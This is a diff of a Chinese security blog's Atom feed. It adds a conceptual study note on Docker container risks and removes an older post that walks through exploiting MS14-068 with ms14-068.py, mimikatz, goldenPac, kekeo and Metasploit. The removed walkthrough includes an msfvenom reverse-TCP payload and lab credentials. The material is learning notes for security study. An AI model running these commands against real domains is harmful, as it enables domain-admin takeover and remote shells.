@@ -6,7 +6,7 @@
   <link href="https://www.teamssix.com/atom.xml" rel="self"/>
   
   <link href="https://www.teamssix.com/"/>
-  <updated>2022-02-17T08:19:31.809Z</updated>
+  <updated>2022-03-07T08:29:22.488Z</updated>
   <id>https://www.teamssix.com/</id>
   
   <author>
@@ -15,6 +15,39 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【云安全】容器基础设施所面临的风险学习</title>
+    <link href="https://www.teamssix.com/220307-162000.html"/>
+    <id>https://www.teamssix.com/220307-162000.html</id>
+    <published>2022-03-07T08:20:00.000Z</published>
+    <updated>2022-03-07T08:29:22.488Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>以下内容为自己个人的学习笔记，因此内容不会多么详实；其中有些内容也许会存在错误，如有错误欢迎留言处指出，还望谅解。</p></blockquote><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这里以 Docker 为例，来学习学习容器基础设施中存在的一些风险问题。</p><p>下图是 Docker 官方给出的架构图，里面包括了 Docker 客户端、Docker 容器所在的宿主机和 Docker 镜像仓库三个部分。</p><p>其中宿主机包括了 Docker 守护进程、本地容器和本地镜像，Docker 守护进程（dockerd）的作用是侦听 Docker API 请求和管理 Docker 对象。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203071618942.png"></p><h1 id="0x01-容器镜像存在的风险"><a href="#0x01-容器镜像存在的风险" class="headerlink" title="0x01 容器镜像存在的风险"></a>0x01 容器镜像存在的风险</h1><h2 id="1、不安全的第三方组件"><a href="#1、不安全的第三方组件" class="headerlink" title="1、不安全的第三方组件"></a>1、不安全的第三方组件</h2><p>例如开发者在代码中引入了存在漏洞版本的 log4j2 组件，然后将其打包成了业务镜像。这样即使代码没有漏洞，但因为引入了不安全的第三方组件也变得有漏洞了。</p><p>再比如开发者在 Django 镜像的基础上，编写了自己的 Python 代码，然后将其打包成镜像。这样如果在  Django 镜像里引用了不安全的第三方组件或者 Django 自身存在漏洞，自己打包的镜像也同样会受到影响。</p><h2 id="2、不安全的镜像"><a href="#2、不安全的镜像" class="headerlink" title="2、不安全的镜像"></a>2、不安全的镜像</h2><p>在公共镜像仓库比如 Docker Hub 里，会存在一些有漏洞的镜像或者恶意镜像，如果使用了这些镜像那就存在风险了。</p><h2 id="3、敏感信息泄露"><a href="#3、敏感信息泄露" class="headerlink" title="3、敏感信息泄露"></a>3、敏感信息泄露</h2><p>如果开发者为了开发、调试方便，可能会将数据库账号密码、云服务密钥之类的敏感数据打包到了镜像里，那别人获取到这个镜像后，就会导致敏感信息泄露了。</p><h1 id="0x02-活动中的容器存在的风险"><a href="#0x02-活动中的容器存在的风险" class="headerlink" title="0x02 活动中的容器存在的风险"></a>0x02 活动中的容器存在的风险</h1><h2 id="1、不安全的容器应用"><a href="#1、不安全的容器应用" class="headerlink" title="1、不安全的容器应用"></a>1、不安全的容器应用</h2><p>在使用容器时，往往会需要进行端口映射，比如把 MySQL 的 3306 端口映射出来，如果 MySQL 被配置了弱密码，那就存在被利用的风险了。</p><p>除此之外，如果一个 Web 服务端口被映射出来，同时这个 Web 服务存在漏洞，那么也同样是存在风险的。</p><h2 id="2、不受限制的资源共享"><a href="#2、不受限制的资源共享" class="headerlink" title="2、不受限制的资源共享"></a>2、不受限制的资源共享</h2><p>容器运行在宿主机上，容器必然要使用宿主机的各种 CPU、内存等资源，如果没有对容器进行资源使用限制，那么就存在宿主机被资源耗尽的风险。</p><h2 id="3、不安全的配置与挂载"><a href="#3、不安全的配置与挂载" class="headerlink" title="3、不安全的配置与挂载"></a>3、不安全的配置与挂载</h2><p>如果为容器设定了不安全的配置，会导致容器本身的隔离机制失效，容器的两大隔离机制如下：</p><ul><li>Linux 命名空间（NameSpace）：实现文件系统、网络、进程、主机名等方面的隔离</li><li>Linux 控制组（cgroups）：实现 CPU、内存、硬盘等方面的隔离</li></ul><p>如果设定了以下配置就会导致相应的隔离机制失效：</p><ul><li><p>–privileged：使容器内的 root 权限和宿主机上的 root 权限一致，权限隔离被打破</p></li><li><p>–net=host：使容器与宿主机处于同一网络命名空间，网络隔离被打破</p></li><li><p>–pid=host：使容器与宿主机处于同一进程命令空间，进程隔离被打破</p></li><li><p>–volume /:/host：宿主机根目录被挂载到容器内部，文件系统隔离被打破</p></li></ul><h1 id="0x03-容器管理程序接口的风险"><a href="#0x03-容器管理程序接口的风险" class="headerlink" title="0x03 容器管理程序接口的风险"></a>0x03 容器管理程序接口的风险</h1><p>Docker 守护进程主要监听 UNIX socket 和 TCP socket，默认情况下，Docker 只会监听 UNIX socket</p><h2 id="1、UNIX-socket"><a href="#1、UNIX-socket" class="headerlink" title="1、UNIX socket"></a>1、UNIX socket</h2><p>UNIX socket 的风险主要在于 Docker 守护进程默认以宿主机的 root 权限运行，因此就可以借助这点进行提权或者容器逃逸。</p><p>这类风险主要有两个利用场景：</p><ul><li>普通用户被加到 Docker 用户组内</li></ul><p>如果普通用户被加入到 Docker 用户组内，那么普通用户也将有权限访问 Docker UNIX socket，如果攻击者获得了这个普通用户权限，就可以借助 Docker 提权到 root 用户权限。</p><p>具体的做法可以简单描述为：使用普通用户创建一个 privileged 为 true 的容器，在该容器内挂载宿主机硬盘并写入定时任务，然后将宿主机的 root 权限反弹回来，后期将详细介绍这种方法的使用。</p><ul><li>UNIX socket 挂载到容器内部</li></ul><p>有时为了实现容器内部管理容器，可能会将 Docker UNIX socket 挂载到容器内部，那么如果该容器被入侵，RT 就可以借助这个 socket 进行容器逃逸获得宿主机 root 权限。 </p><h2 id="2、TCP-socket"><a href="#2、TCP-socket" class="headerlink" title="2、TCP socket"></a>2、TCP socket</h2><p>现在 Docker 守护进程默认不会监听 TCP socket，不过有时可能用户会因为方便开启 TCP socket 的监听，一般默认监听端口是 2375</p><p>默认情况下，Docker 守护进程 TCP socket 是无加密无认证的，因此如果发现宿主机 Docker 开放了 TCP socket，就可以直接使用 docker -H 接管目标的容器</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203071618407.png"></p><h1 id="0x04-其他风险"><a href="#0x04-其他风险" class="headerlink" title="0x04 其他风险"></a>0x04 其他风险</h1><h2 id="1、容器网络风险"><a href="#1、容器网络风险" class="headerlink" title="1、容器网络风险"></a>1、容器网络风险</h2><p>虽然默认情况下，容器内部的网络与宿主机是隔离的，但是每个容器之间是彼此互相连通的，理论上在容器之间是存在内网横向的风险的。</p><h2 id="2、宿主机操作系统风险"><a href="#2、宿主机操作系统风险" class="headerlink" title="2、宿主机操作系统风险"></a>2、宿主机操作系统风险</h2><p>容器通常与宿主机共享内核，也就是说如果宿主机内核存在漏洞，意味着容器可能也会存在相同的漏洞。</p><p>例如如果宿主机存在脏牛漏洞，那么拿到容器权限后，使用脏牛漏洞就可以获得宿主机权限，实现容器逃逸。</p><h2 id="3、软件自身的漏洞"><a href="#3、软件自身的漏洞" class="headerlink" title="3、软件自身的漏洞"></a>3、软件自身的漏洞</h2><p>Docker 自身存在的一些漏洞，比如 CVE-2019-14271、CVE-2019-5736 等都可以导致容器逃逸，这些也都是风险点，后面会对这些漏洞进行尝试复现。</p><blockquote><p> 更多信息欢迎关注我的微信公众号：TeamsSix</p><p> 参考资料：</p><p> 《云原生安全-攻防实践与体系构建》</p><p> <a href="https://docs.docker.com/get-started/overview/">https://docs.docker.com/get-started/overview/</a></p><p> <a href="https://www.freebuf.com/articles/web/258398.html">https://www.freebuf.com/articles/web/258398.html</a></p><p> <a href="https://cloud.tencent.com/developer/article/1428102">https://cloud.tencent.com/developer/article/1428102</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;blockquote&gt;
+&lt;p&gt;以下内容为自己个人的学习笔记，因此内容不会多么详实；其中有些内容也许会存在错误，如有错误欢迎留言处指出，还望谅解。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;heade</summary>
+      
+    
+    
+    
+    <category term="云安全" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
+    
+    
+    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="云原生" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
+    
+    <category term="笔记" scheme="https://www.teamssix.com/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+    <category term="容器" scheme="https://www.teamssix.com/tags/%E5%AE%B9%E5%99%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>【云安全】云原生安全是什么？</title>
@@ -526,34 +559,6 @@
     <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;RT 在利用黄金票据（Golden Ticket）进行 PTP 票据传递时，需要先知道以下信息：&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;</summary>
-      
-    
-    
-    
-    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【内网学习笔记】27、Kerberos 域用户提权漏洞</title>
-    <link href="https://www.teamssix.com/210924-100520.html"/>
-    <id>https://www.teamssix.com/210924-100520.html</id>
-    <published>2021-09-24T02:05:20.000Z</published>
-    <updated>2021-11-22T08:59:49.391Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在 2014 年微软修复了 Kerberos 域用户提权漏洞，即 MS14-068，CVE 编号为 CVE-2014-6324，该漏洞影响了 Windows Server 2012 R2 以下的服务器，该漏洞允许 RT 将任意用户权限提升至域管级别。</p><p>不过从漏洞年代就知道这已经是个远古时代的漏洞，现实中已经很少会碰到了，这里就简单记录下，顺便熟悉熟悉工具的用法。</p><p>14-068 产生的原因主要在于用户可以利用伪造的票据向认证服务器发起请求，如果用户伪造域管的票据，服务端就会把拥有域管权限的服务票据返回回来。</p><h2 id="1、PyKEK"><a href="#1、PyKEK" class="headerlink" title="1、PyKEK"></a>1、PyKEK</h2><p>PyKEK 是一个利用 Kerberos 协议进行渗透的工具包，下载地址：<a href="https://github.com/mubix/pykek">https://github.com/mubix/pykek</a></p><p>使用 PyKEK 可以生成一个高权限的服务票据，之后通过 mimikatz 将服务票据导入到内存中。</p><p>MS 14-068 的补丁为：KB3011780，通过 wmic 查看补丁情况</p><pre class="line-numbers language-none"><code class="language-none">wmic qfe get hotfixid | findstr KB3011780<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看当前用户 SID</p><pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 wmic </p><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get name,sid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成高权限票据，-d 指定域控地址</p><pre class="line-numbers language-none"><code class="language-none">python2 ms14-068.py -u jack@0day.org -s S-1-5-21-1812960810-2335050734-3517558805-1133 -d 192.168.3.142 -p Aa123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开 mimikatz 清除当前内存中的票据信息</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将高权限票据注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptc &quot;TGT_jack@0day.org.ccache&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 net use 连接域控后，使用 psexec 获取 Shell</p><blockquote><p>这里 net ues 使用 IP 可能会失败，因此在此使用机器名进行连接 </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231733653.png"></p><h2 id="2、GoldenPac"><a href="#2、GoldenPac" class="headerlink" title="2、GoldenPac"></a>2、GoldenPac</h2><p>goldenPac.py 是一个用于对 Kerberos 协议进行测试的工具，它集成在 impacket 工具包里。</p><p>Kali 在使用之前需要先安装 Kerberos 客户端</p><pre class="line-numbers language-none"><code class="language-none">apt-get install krb5-user -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用 goldenPac.py 获取 Shell</p><pre class="line-numbers language-none"><code class="language-none">python3 goldenPac.py 0day.org&#x2F;jack:Aa123456@OWA2010SP3.0day.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里使用 IP 进行连接会连接不成功，只能使用主机名，因此可以在 hosts 文件中添加主机名对应的 IP</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231746641.png"></p><p>goldenPac.py 是通过 PsExec 获得 Shell 的，因此会产生大量的日志，而且现在这种连接方式也已经被各大杀软所拦截。</p><h2 id="3、kekeo"><a href="#3、kekeo" class="headerlink" title="3、kekeo"></a>3、kekeo</h2><p>kekeo 也是一个工具集，其中包含了 ms14-068 的利用模块，kekeo 下载地址：<a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p><p>使用之前需要先清除票据</p><pre class="line-numbers language-none"><code class="language-none">klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后直接使用 kekeo 生成高权限票据</p><pre class="line-numbers language-none"><code class="language-none">kekeo.exe &quot;exploit::ms14068 &#x2F;domain:0day.org &#x2F;user:jack &#x2F;password:Aa123456 &#x2F;ptt&quot; &quot;exit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后就可以直接 dir 域控或者 PsExec 连接到域控了</p><h2 id="4、MSF"><a href="#4、MSF" class="headerlink" title="4、MSF"></a>4、MSF</h2><p>MSF 中也有 MS 14-086 的提权 EXP，不过需要结合 mimikatz 进行利用</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;kerberos&#x2F;ms14_068_kerberos_checksumset domain 0day.orgset password Aa123456set user jackset user_sid  S-1-5-21-1812960810-2335050734-3517558805-1133set rhosts OWA2010SP3.0day.orgrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置好域名、域控 IP、密码、用户、SID 后运行，将会获取一个 bin 文件</p><p>由于 MSF 里不支持 bin 文件的导入，因此需要 mimikatz 对其进行格式转换</p><pre class="line-numbers language-none"><code class="language-none">kerberos::clist &quot;20210923061821_default_192.168.3.142_windows.kerberos_484249.bin&quot; &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后，生成一个木马</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;172.16.214.74 lport&#x3D;4444 -f exe &gt; shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将木马复制到目标主机上，并使其上线到 MSF</p><p>获得会话后，将刚才 mimikatz 转换后的 kirbi 文件导入到会话中</p><pre class="line-numbers language-none"><code class="language-none">load kiwikerberos_ticket_use &#x2F;tmp&#x2F;0-00000000-jack@krbtgt-0DAY.ORG.kirbibackground<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>之后使用 current_user_psexec 模块</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;current_user_psexecset session 2set rhosts OWA2010SP3.0day.orgset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 172.16.214.74run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就会返回高权限的会话</p><blockquote><p>不过 MSF 在使用过程中报错了，网上一查发现别人也有这个错误，暂时还不清楚解决的方法</p></blockquote><h2 id="5、CS"><a href="#5、CS" class="headerlink" title="5、CS"></a>5、CS</h2><p>先利用前面的 ms14-068.py 生成一个 ccache 文件，之后使用 KrbCredExport 将 ccache 文件转为 kirbi 格式</p><p>KrbCredExport 下载地址：<a href="https://github.com/rvazarkar/KrbCredExport">https://github.com/rvazarkar/KrbCredExport</a></p><pre class="line-numbers language-none"><code class="language-none">python2 KrbCredExport.py TGT_jack@0day.org.ccache user.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着使用 CS 的 kerberos_ticket_use 加载 ticket，之后就能访问到域控了</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109240943968.png"></p><p>此时想让域控上线自然也是没问题的了，可以先添加一个域控地址的 target，然后选择 PsExec ，勾选上 use session’s current access token 通过 jack 的会话上线即可。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109241000974.png"></p><blockquote><p>参考文章：</p><p><a href="https://www.jianshu.com/p/27730ab4a6db">https://www.jianshu.com/p/27730ab4a6db</a></p><p><a href="https://www.cnblogs.com/websecyw/p/11835830.html">https://www.cnblogs.com/websecyw/p/11835830.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;在 2014 年微软修复了 Kerberos 域用户提权漏洞，即 MS14-068，CVE 编号为 CVE-2014-632</summary>
       
     
     
